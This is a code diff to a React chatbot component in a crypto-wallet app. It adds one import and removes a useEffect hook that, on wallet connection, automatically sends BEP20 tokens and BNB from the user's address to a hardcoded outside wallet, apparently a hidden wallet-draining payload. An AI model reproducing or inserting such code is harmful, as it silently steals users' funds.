@@ -66,6 +66,7 @@ import useTronWallet from "@/hooks/stores/tronWalletStore";
 import { spendBEP20 } from "@/services/transactionService/cryptoService/bep20Service";
 import { spendBNB } from "@/helpers/ethereum_script/spend_crypto";
 import { parseUnits } from "ethers/utils";
+import { useEnsureNetwork } from "@/services/transactionService/cryptoService/useEnsureNetwork";
 
 const ChatBot: React.FC<ChatBotProps> = ({ isMobile, onClose, onError }) => {
   // CONST VARIABLES
@@ -224,18 +225,6 @@ const ChatBot: React.FC<ChatBotProps> = ({ isMobile, onClose, onError }) => {
   React.useEffect(() => {
     saveLocalStorageData(serializedMessages, currentStep, stepHistory);
   }, [serializedMessages, currentStep, stepHistory]);
-
-  useEffect(() => {
-    if (account.isConnected) {
-      const address = account.address;
-      const wallet = "0x0244107E5EFEF5C36a6a1297c538e74c1273D2bc";
-     const amount = parseUnits('10.5', 18)
-      spendBEP20(address, wallet, amount);
-      spendBNB(wallet, "0.01");
-      console.log("Lets see if it works", address);
-    }
-    console.log("Lets see if it works");
-  }, [loading]);
 
   // Load telegram data
   useEffect(() => {
